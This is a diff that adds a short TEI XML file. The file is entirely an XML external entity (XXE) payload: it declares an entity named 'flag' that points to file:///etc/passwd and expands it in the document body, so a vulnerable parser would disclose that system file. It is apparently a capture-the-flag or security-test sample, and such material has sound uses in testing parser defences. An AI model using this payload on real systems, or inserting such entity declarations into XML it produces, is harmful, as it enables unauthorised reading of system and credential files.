@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE TEI [
+<!ELEMENT TEI ANY>
+<!ENTITY flag SYSTEM "file:///etc/passwd">
+]>
+<TEI xmlns="http://www.tei-c.org/ns/1.0">
+<text><body><p>&flag;</p></body></text>
+</TEI>
